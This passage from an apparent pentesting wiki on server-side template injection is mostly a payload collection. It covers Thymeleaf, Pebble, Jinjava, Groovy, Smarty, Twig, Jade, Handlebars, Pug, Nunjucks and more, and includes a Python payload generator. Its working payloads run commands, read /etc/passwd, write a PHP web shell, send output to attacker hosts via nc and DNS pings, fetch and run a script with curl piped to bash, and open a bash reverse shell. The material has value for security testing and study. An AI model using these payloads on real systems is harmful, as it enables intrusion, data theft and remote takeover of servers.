try\n#{...}\n,\n*{...}\n,\n@{...}\nor\n~{...}\n.\nRead\n/etc/passwd\n$\n{\nT\n(\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n).\ntoString\n(\nT\n(\njava\n.\nlang\n.\nRuntime\n).\ngetRuntime\n().\nexec\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n99\n).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n97\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n116\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n32\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n47\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n101\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n116\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n99\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n47\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n112\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n97\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n115\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n115\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n119\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n100\n))).\ngetInputStream\n())}\nCustom Script for payload generation\n#!/usr/bin/python3\n‚Äã\n## Written By Zeyad Abulaban (zAbuQasem)\n# Usage: python3 gen.py \"id\"\n‚Äã\nfrom\nsys\nimport\nargv\n‚Äã\ncmd\n=\nlist\n(\nargv\n[\n1\n].\nstrip\n())\nprint\n(\n\"Payload: \"\n,\ncmd\n,\nend\n=\n\"\\n\\n\"\n)\nconverted\n=\n[\nord\n(\nc\n)\nfor\nc\nin\ncmd\n]\nbase_payload\n=\n'*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'\nend_payload\n=\n'.getInputStream())}'\n‚Äã\ncount\n=\n1\nfor\ni\nin\nconverted\n:\nif\ncount\n==\n1\n:\nbase_payload\n+=\nf\"(T(java.lang.Character).toString(\n{\ni\n}\n).concat\"\ncount\n+=\n1\nelif\ncount\n==\nlen\n(\nconverted\n):\nbase_payload\n+=\nf\"(T(java.lang.Character).toString(\n{\ni\n}\n)))\"\nelse\n:\nbase_payload\n+=\nf\"(T(java.lang.Character).toString(\n{\ni\n}\n)).concat\"\ncount\n+=\n1\n‚Äã\nprint\n(\nbase_payload\n+\nend_payload\n)\nMore Information\n‚Äã\nThymleaf SSTI\n‚Äã\n‚Äã\nPayloads all the things\n‚Äã\nSpring View Manipulation (Java)\n__$\n{\nnew\njava\n.\nutil\n.\nScanner\n(\nT\n(\njava\n.\nlang\n.\nRuntime\n).\ngetRuntime\n().\nexec\n(\n\"id\"\n).\ngetInputStream\n()).\nnext\n()}\n__\n::\n.\nx\n__$\n{\nT\n(\njava\n.\nlang\n.\nRuntime\n).\ngetRuntime\n().\nexec\n(\n\"touch executed\"\n)}\n__\n::\n.\nx\n‚Äã\nhttps://github.com/veracode-research/spring-view-manipulation\n‚Äã\nEL - Expression Language\nPebble (Java)\n{{ someString.toUPPERCASE() }}\nOld version of Pebble ( < version 3.0.9):\n{{\nvariable\n.\ngetClass\n().\nforName\n(\n'\njava\n.\nlang\n.\nRuntime\n'\n).\ngetRuntime\n().\nexec\n(\n'ls -la'\n)\n}}\nNew version of Pebble :\n{\n%\nset cmd\n=\n'id'\n%\n}\n‚Äã\n‚Äã\n{\n%\nset bytes\n=\n(\n1\n).\nTYPE\n.\nforName\n(\n'\njava\n.\nlang\n.\nRuntime\n'\n)\n.\nmethods\n[\n6\n]\n.\ninvoke\n(\nnull\n,\nnull\n)\n.\nexec\n(\ncmd\n)\n.\ninputStream\n.\nreadAllBytes\n()\n%\n}\n{{\n(\n1\n).\nTYPE\n.\nforName\n(\n'\njava\n.\nlang\n.\nString\n'\n)\n.\nconstructors\n[\n0\n]\n.\nnewInstance\n(([\nbytes\n]).\ntoArray\n())\n}}\nJinjava (Java)\n{{\n'a'\n.\ntoUpperCase\n()}}\nwould result in\n'A'\n{{\nrequest\n}}\nwould\nreturn\na request object like com\n.[...].\ncontext\n.\nTemplateContextRequest\n@23548206\nJinjava is an open source project developed by Hubspot, available at\nhttps://github.com/HubSpot/jinjava/\n‚Äã\nJinjava - Command execution\nFixed by\nhttps://github.com/HubSpot/jinjava/pull/230\n‚Äã\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nnew\njava\n.\nlang\n.\nString\n(\n'xxx'\n)\n\\\"\n)}}\n‚Äã\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nvar\nx\n=\nnew\njava\n.\nlang\n.\nProcessBuilder\n;\nx\n.\ncommand\n(\n\\\\\\\"whoami\\\\\\\"\n);\nx\n.\nstart\n()\n\\\"\n)}}\n‚Äã\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nvar\nx\n=\nnew\njava\n.\nlang\n.\nProcessBuilder\n;\nx\n.\ncommand\n(\n\\\\\\\"netstat\\\\\\\"\n);\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n.\ntoString\n(\nx\n.\nstart\n().\ngetInputStream\n())\n\\\"\n)}}\n‚Äã\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nvar\nx\n=\nnew\njava\n.\nlang\n.\nProcessBuilder\n;\nx\n.\ncommand\n(\n\\\\\\\"uname\\\\\\\"\n,\n\\\\\\\"\n-\na\\\\\\\"\n);\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n.\ntoString\n(\nx\n.\nstart\n().\ngetInputStream\n())\n\\\"\n)}}\nMore information\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava\n‚Äã\nHubspot - HuBL (Java)\n{% %}\nstatement delimiters\n{{ }}\nexpression delimiters\n{# #}\ncomment delimiters\n{{ request }}\n- com.hubspot.content.hubl.context.TemplateContextRequest@23548206\n{{'a'.toUpperCase()}}\n- \"A\"\n{{'a'.concat('b')}}\n- \"ab\"\n{{'a'.getClass()}}\n- java.lang.String\n{{request.getClass()}}\n- class com.hubspot.content.hubl.context.TemplateContextRequest\n{{request.getClass().getDeclaredMethods()[0]}}\n- public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()\nSearch for \"com.hubspot.content.hubl.context.TemplateContextRequest\" and discovered the\nJinjava project on Github\n.\n{{\nrequest\n.\nisDebug\n()}}\n//output: False\n‚Äã\n//Using string 'a' to get an instance of class sun.misc.Launcher\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\nsun\n.\nmisc\n.\nLauncher\n'\n).\nnewInstance\n()}}\n//output: sun.misc.Launcher@715537d4\n‚Äã\n//It is also possible to get a new object of the Jinjava class\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\ncom\n.\nhubspot\n.\njinjava\n.\nJinjavaConfig\n'\n).\nnewInstance\n()}}\n//output: com.hubspot.jinjava.JinjavaConfig@78a56797\n‚Äã\n//It was also possible to call methods on the created object by combining the\n‚Äã\n‚Äã\n‚Äã\n‚Äã\n‚Äã\n‚Äã\n‚Äã\n{\n%\n%\n}\nand\n{{\n}}\nblocks\n{\n%\nset ji\n=\n'a'\n.\ngetClass\n().\nforName\n(\n'\ncom\n.\nhubspot\n.\njinjava\n.\nJinjava\n'\n).\nnewInstance\n().\nnewInterpreter\n()\n%\n}\n‚Äã\n‚Äã\n{{\nji\n.\nrender\n(\n'\n{{\n1\n*\n2\n}}\n'\n)}}\n//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.\n‚Äã\n//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n//output: xxx\n‚Äã\n//RCE\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nvar\nx\n=\nnew\njava\n.\nlang\n.\nProcessBuilder\n;\nx\n.\ncommand\n(\n\\\\\\\"whoami\\\\\\\"\n);\nx\n.\nstart\n()\n\\\"\n)}}\n//output: java.lang.UNIXProcess@1e5f456e\n‚Äã\n//RCE with org.apache.commons.io.IOUtils.\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nvar\nx\n=\nnew\njava\n.\nlang\n.\nProcessBuilder\n;\nx\n.\ncommand\n(\n\\\\\\\"netstat\\\\\\\"\n);\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n.\ntoString\n(\nx\n.\nstart\n().\ngetInputStream\n())\n\\\"\n)}}\n//output: netstat execution\n‚Äã\n//Multiple arguments to the commands\nPayload\n:\n{{\n'a'\n.\ngetClass\n().\nforName\n(\n'\njavax\n.\nscript\n.\nScriptEngineManager\n'\n).\nnewInstance\n().\ngetEngineByName\n(\n'\nJavaScript\n'\n).\neval\n(\n\\\"\nvar\nx\n=\nnew\njava\n.\nlang\n.\nProcessBuilder\n;\nx\n.\ncommand\n(\n\\\\\\\"uname\\\\\\\"\n,\n\\\\\\\"\n-\na\\\\\\\"\n);\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n.\ntoString\n(\nx\n.\nstart\n().\ngetInputStream\n())\n\\\"\n)}}\n//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nMore information\n‚Äã\nhttps://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html\n‚Äã\nExpression Language - EL (Java)\n${\"aaaa\"}\n- \"aaaa\"\n${99999+1}\n- 100000.\n#{7*7}\n- 49\n${{7*7}}\n- 49\n${{request}}, ${{session}}, {{faceContext}}\nEL provides an important mechanism for enabling the presentation layer (web pages) to communicate with the application logic (managed beans). The EL is used by\nseveral JavaEE technologies\n, such as JavaServer Faces technology, JavaServer Pages (JSP) technology, and Contexts and Dependency Injection for Java EE (CDI).\nCheck the following page to learn more about the\nexploitation of EL interpreters\n:\nEL - Expression Language\nGroovy (Java)\nThis Security Manager bypass was taken from this\nwriteup\n.\n//Basic Payload\nimport\ngroovy\n.\n*\n;\n@groovy.transform.ASTTest\n(\nvalue\n=\n{\ncmd\n=\n\"ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net \"\nassert\njava\n.\nlang\n.\nRuntime\n.\ngetRuntime\n().\nexec\n(\ncmd\n.\nsplit\n(\n\" \"\n))\n})\ndef x\n‚Äã\n//Payload to get output\nimport\ngroovy\n.\n*\n;\n@groovy.transform.ASTTest\n(\nvalue\n=\n{\ncmd\n=\n\"whoami\"\n;\nout\n=\nnew\njava\n.\nutil\n.\nScanner\n(\njava\n.\nlang\n.\nRuntime\n.\ngetRuntime\n().\nexec\n(\ncmd\n.\nsplit\n(\n\" \"\n)).\ngetInputStream\n()).\nuseDelimiter\n(\n\"\\\\A\"\n).\nnext\n()\ncmd2\n=\n\"ping \"\n+\nout\n.\nreplaceAll\n(\n\"[^a-zA-Z0-9]\"\n,\n\"\"\n)\n+\n\".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net\"\n;\njava\n.\nlang\n.\nRuntime\n.\ngetRuntime\n().\nexec\n(\ncmd2\n.\nsplit\n(\n\" \"\n))\n})\ndef x\n‚Äã\n//Other payloads\nnew\ngroovy\n.\nlang\n.\nGroovyClassLoader\n().\nparseClass\n(\n\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\"\n)\nthis\n.\nevaluate\n(\nnew\nString\n(\njava\n.\nutil\n.\nBase64\n.\ngetDecoder\n().\ndecode\n(\n\"QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==\"\n)))\nthis\n.\nevaluate\n(\nnew\nString\n(\nnew\nbyte\n[]{\n64\n,\n103\n,\n114\n,\n111\n,\n111\n,\n118\n,\n121\n,\n46\n,\n116\n,\n114\n,\n97\n,\n110\n,\n115\n,\n102\n,\n111\n,\n114\n,\n109\n,\n46\n,\n65\n,\n83\n,\n84\n,\n84\n,\n101\n,\n115\n,\n116\n,\n40\n,\n118\n,\n97\n,\n108\n,\n117\n,\n101\n,\n61\n,\n123\n,\n97\n,\n115\n,\n115\n,\n101\n,\n114\n,\n116\n,\n32\n,\n106\n,\n97\n,\n118\n,\n97\n,\n46\n,\n108\n,\n97\n,\n110\n,\n103\n,\n46\n,\n82\n,\n117\n,\n110\n,\n116\n,\n105\n,\n109\n,\n101\n,\n46\n,\n103\n,\n101\n,\n116\n,\n82\n,\n117\n,\n110\n,\n116\n,\n105\n,\n109\n,\n101\n,\n40\n,\n41\n,\n46\n,\n101\n,\n120\n,\n101\n,\n99\n,\n40\n,\n34\n,\n105\n,\n100\n,\n34\n,\n41\n,\n125\n,\n41\n,\n100\n,\n101\n,\n102\n,\n32\n,\n120\n}))\n‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\n‚Äã\nSmarty (PHP)\n{\n$smarty\n.\nversion\n}\n{\nphp\n}\necho\n`id`\n;{\n/\nphp\n}\n//deprecated in smarty v3\n{\nSmarty_Internal_Write_File\n::\nwriteFile\n(\n$SCRIPT_NAME\n,\n\"<?php passthru(\n$_GET\n[\n'cmd'\n]\n); ?>\"\n,\nself\n::\nclearConfig\n())}\n{\nsystem\n(\n'ls'\n)}\n// compatible v3\n{\nsystem\n(\n'cat index.php'\n)}\n// compatible v3\nMore information\nIn Smarty section of\nhttps://portswigger.net/research/server-side-template-injection\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty\n‚Äã\nTwig (PHP)\n{{7*7}} = 49\n${7*7} = ${7*7}\n{{7*'7'}} = 49\n{{1/0}} = Error\n{{foobar}} Nothing\n#Get Info\n{{\n_self\n}}\n#(Ref. to current application)\n{{\n_self\n.\nenv\n}}\n{{\ndump\n(\napp\n)}}\n{{\napp\n.\nrequest\n.\nserver\n.\nall\n|\njoin\n(\n','\n)}}\n‚Äã\n#File read\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"\n@\n‚Äã\n#Exec code\n{{\n_self\n.\nenv\n.\nsetCache\n(\n\"ftp://attacker.net:2121\"\n)}}{{\n_self\n.\nenv\n.\nloadTemplate\n(\n\"backdoor\"\n)}}\n{{\n_self\n.\nenv\n.\nregisterUndefinedFilterCallback\n(\n\"exec\"\n)}}{{\n_self\n.\nenv\n.\ngetFilter\n(\n\"id\"\n)}}\n{{\n_self\n.\nenv\n.\nregisterUndefinedFilterCallback\n(\n\"system\"\n)}}{{\n_self\n.\nenv\n.\ngetFilter\n(\n\"whoami\"\n)}}\n{{\n_self\n.\nenv\n.\nregisterUndefinedFilterCallback\n(\n\"system\"\n)}}{{\n_self\n.\nenv\n.\ngetFilter\n(\n\"id;uname -a;hostname\"\n)}}\n{{[\n'id'\n]\n|\nfilter\n(\n'system'\n)}}\n{{[\n'cat\\x20/etc/passwd'\n]\n|\nfilter\n(\n'system'\n)}}\n{{[\n'cat$IFS/etc/passwd'\n]\n|\nfilter\n(\n'system'\n)}}\nTwig - Template format\n$output\n=\n$twig\n>\nrender\n(\n'Dear'\n.\n$_GET\n[\n'custom_greeting'\n],\narray\n(\n\"first_name\"\n=>\n$user\n.\nfirst_name\n)\n);\n‚Äã\n$output\n=\n$twig\n>\nrender\n(\n\"Dear {first_name}\"\n,\narray\n(\n\"first_name\"\n=>\n$user\n.\nfirst_name\n)\n);\nMore information\nIn Twig and Twig (Sandboxed) section of\nhttps://portswigger.net/research/server-side-template-injection\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig\n‚Äã\nPlates (PHP)\nPlates is inspired by Twig but a native PHP template engine instead of a compiled template engine.\ncontroller:\n// Create new Plates instance\n$templates\n=\nnew\nLeague\n\\\nPlates\n\\\nEngine\n(\n'/path/to/templates'\n);\n‚Äã\n// Render a template\necho\n$templates\n->\nrender\n(\n'profile'\n,\n[\n'name'\n=>\n'Jonathan'\n]);\npage template:\n<?php\n$this\n->\nlayout\n(\n'template'\n,\n[\n'title'\n=>\n'User Profile'\n])\n?>\n‚Äã\n<\nh1\n>\nUser Profile\n</\nh1\n>\n<\np\n>\nHello\n,\n<?=\n$this\n->\ne\n(\n$name\n)\n?></\np\n>\nlayout template:\n<\nhtml\n>\n<\nhead\n>\n<\ntitle\n>\n<?=$this->e($title)?>\n</\ntitle\n>\n</\nhead\n>\n<\nbody\n>\n<?=$this->section('content')?>\n</\nbody\n>\n</\nhtml\n>\nPHPlib and HTML_Template_PHPLIB (PHP)\n‚Äã\nHTML_Template_PHPLIB\nis the same as PHPlib but ported to Pear.\nauthors.tpl\n<\nhtml\n>\n<\nhead\n>\n<\ntitle\n>\n{PAGE_TITLE}\n</\ntitle\n>\n</\nhead\n>\n<\nbody\n>\n<\ntable\n>\n<\ncaption\n>\nAuthors\n</\ncaption\n>\n<\nthead\n>\n<\ntr\n>\n<\nth\n>\nName\n</\nth\n>\n<\nth\n>\nEmail\n</\nth\n>\n</\ntr\n>\n</\nthead\n>\n<\ntfoot\n>\n<\ntr\n>\n<\ntd\ncolspan\n=\n\"\n2\n\"\n>\n{NUM_AUTHORS}\n</\ntd\n>\n</\ntr\n>\n</\ntfoot\n>\n<\ntbody\n>\n<!-- BEGIN authorline -->\n<\ntr\n>\n<\ntd\n>\n{AUTHOR_NAME}\n</\ntd\n>\n<\ntd\n>\n{AUTHOR_EMAIL}\n</\ntd\n>\n</\ntr\n>\n<!-- END authorline -->\n</\ntbody\n>\n</\ntable\n>\n</\nbody\n>\n</\nhtml\n>\nauthors.php\n<?php\n//we want to display this author list\n$authors\n=\narray\n(\n'Christian Weiske'\n=>\n'\n[email¬†protected]\n'\n,\n'Bjoern Schotte'\n=>\n'\n[email¬†protected]\n'\n);\n‚Äã\nrequire_once\n'HTML/Template/PHPLIB.php'\n;\n//create template object\n$t\n=&\nnew\nHTML_Template_PHPLIB\n(\ndirname\n(\n__FILE__\n),\n'keep'\n);\n//load file\n$t\n->\nsetFile\n(\n'authors'\n,\n'authors.tpl'\n);\n//set block\n$t\n->\nsetBlock\n(\n'authors'\n,\n'authorline'\n,\n'authorline_ref'\n);\n‚Äã\n//set some variables\n$t\n->\nsetVar\n(\n'NUM_AUTHORS'\n,\ncount\n(\n$authors\n));\n$t\n->\nsetVar\n(\n'PAGE_TITLE'\n,\n'Code authors as of '\n.\ndate\n(\n'Y-m-d'\n));\n‚Äã\n//display the authors\nforeach\n(\n$authors\nas\n$name\n=>\n$email\n)\n{\n$t\n->\nsetVar\n(\n'AUTHOR_NAME'\n,\n$name\n);\n$t\n->\nsetVar\n(\n'AUTHOR_EMAIL'\n,\n$email\n);\n$t\n->\nparse\n(\n'authorline_ref'\n,\n'authorline'\n,\ntrue\n);\n}\n‚Äã\n//finish and echo\necho\n$t\n->\nfinish\n(\n$t\n->\nparse\n(\n'OUT'\n,\n'authors'\n));\n?>\nJade (NodeJS)\n-\nvar\nx\n=\nroot\n.\nprocess\n-\nx\n=\nx\n.\nmainModule\n.\nrequire\n-\nx\n=\nx\n(\n'child_process'\n)\n=\nx\n.\nexec\n(\n'id | nc attacker.net 80'\n)\n#\n{\nroot\n.\nprocess\n.\nmainModule\n.\nrequire\n(\n'child_process'\n).\nspawnSync\n(\n'cat'\n,\n[\n'/etc/passwd'\n]).\nstdout\n}\nMore information\nIn Jade section of\nhttps://portswigger.net/research/server-side-template-injection\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen\n‚Äã\npatTemplate (PHP)\n‚Äã\npatTemplate\nnon-compiling PHP templating engine, that uses XML tags to divide a document into different parts\n<\npatTemplate:\ntmpl\nname\n=\n\"\npage\n\"\n>\nThis is the main page.\n<\npatTemplate:\ntmpl\nname\n=\n\"\nfoo\n\"\n>\nIt contains another template.\n</\npatTemplate:\ntmpl\n>\n<\npatTemplate:\ntmpl\nname\n=\n\"\nhello\n\"\n>\nHello {NAME}.\n<\nbr\n/>\n</\npatTemplate:\ntmpl\n>\n</\npatTemplate:\ntmpl\n>\nHandlebars (NodeJS)\nPath Traversal (more info\nhere\n).\ncurl\n-X\n'POST'\n-H\n'Content-Type: application/json'\n--data-binary\n$'{\n\\\"\nprofile\n\\\"\n:{\"layout\n\\\"\n:\n\\\"\n./../routes/index.js\n\\\"\n}}'\n'http://ctf.shoebpatel.com:9090/'\n= Error\n${7*7} = ${7*7}\nNothing\n{{\n#\nwith\n\"s\"\nas\n|\nstring\n|\n}}\n{{\n#\nwith\n\"e\"\n}}\n{{\n#\nwith\nsplit\nas\n|\nconslist\n|\n}}\n{{\nthis\n.\npop\n}}\n{{\nthis\n.\npush\n(\nlookup string\n.\nsub\n\"constructor\"\n)}}\n{{\nthis\n.\npop\n}}\n{{\n#\nwith\nstring\n.\nsplit\nas\n|\ncodelist\n|\n}}\n{{\nthis\n.\npop\n}}\n{{\nthis\n.\npush\n\"return require('child_process').exec('whoami');\"\n}}\n{{\nthis\n.\npop\n}}\n{{\n#each conslist\n}}\n{{\n#\nwith\n(\nstring\n.\nsub\n.\napply\n0\ncodelist\n)}}\n{{\nthis\n}}\n{{\n/\nwith\n}}\n{{\n/\neach\n}}\n{{\n/\nwith\n}}\n{{\n/\nwith\n}}\n{{\n/\nwith\n}}\n{{\n/\nwith\n}}\n‚Äã\nURLencoded\n:\n%\n7\nB\n%\n7\nB\n%\n23\nwith\n%\n20\n%\n22\ns\n%\n22\n%\n20\nas\n%\n20\n%\n7\nCstring\n%\n7\nC\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n23\nwith\n%\n20\n%\n22\ne\n%\n22\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n23\nwith\n%\n20\nsplit\n%\n20\nas\n%\n20\n%\n7\nCconslist\n%\n7\nC\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n2\nEpop\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n2\nEpush\n%\n20\n%\n28l\nookup\n%\n20\nstring\n%\n2\nEsub\n%\n20\n%\n22\nconstructor\n%\n22\n%\n29\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n2\nEpop\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n23\nwith\n%\n20\nstring\n%\n2\nEsplit\n%\n20\nas\n%\n20\n%\n7\nCcodelist\n%\n7\nC\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n2\nEpop\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n2\nEpush\n%\n20\n%\n22\nreturn\n%\n20\nrequire\n%\n28\n%\n27\nchild\n%\n5F\nprocess\n%\n27\n%\n29\n%\n2\nEexec\n%\n28\n%\n27\nwhoami\n%\n27\n%\n29\n%\n3\nB\n%\n22\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n2\nEpop\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n23\neach\n%\n20\nconslist\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n23\nwith\n%\n20\n%\n28\nstring\n%\n2\nEsub\n%\n2\nEapply\n%\n200\n%\n20\ncodelist\n%\n29\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nBthis\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n2F\nwith\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n2F\neach\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n2F\nwith\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n2F\nwith\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n20\n%\n20\n%\n7\nB\n%\n7\nB\n%\n2F\nwith\n%\n7D\n%\n7D\n%\n0D\n%\n0\nA\n%\n7\nB\n%\n7\nB\n%\n2F\nwith\n%\n7D\n%\n7D\nMore information\n‚Äã\nhttp://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html\n‚Äã\nJsRender (NodeJS)\nTemplate\nDescription\n‚Äã\nEvaluate and render output\n‚Äã\nEvaluate and render HTML encoded output\n‚Äã\nComment\nand\nAllow code (disabled by default)\n= 49\nClient Side\n{{:\n%\n22test\n%\n22\n.\ntoString\n.\nconstructor\n.\ncall\n({},\n%\n22alert\n(\n%\n27xss\n%\n27\n)\n%\n22\n)()}}\nServer Side\n{{\n:\n\"pwnd\"\n.toString.constructor.call\n({}\n,\n\"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()\"\n)()}}\nMore information\n‚Äã\nhttps://appcheck-ng.com/template-injection-jsrender-jsviews/\n‚Äã\nPugJs (NodeJS)\n#{7*7} = 49\n#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('touch /tmp/pwned.txt')}()}\n#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl 10.10.14.3:8001/s.sh | bash')}()}\nExample server side render\nvar\npugjs\n=\nrequire\n(\n'pug'\n);\nhome\n=\npugjs\n.\nrender\n(\ninjected_page\n)\nMore information\n‚Äã\nhttps://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/\n‚Äã\nNUNJUCKS (NodeJS)\n{{7*7}} = 49\n{{foo}} = No output\n#{7*7} = #{7*7}\n{{console.log(1)}} = Error\n{{\nrange\n.\nconstructor\n(\n\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\"\n)()}}\n{{\nrange\n.\nconstructor\n(\n\"return global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\\\"')\"\n)()}}\nMore 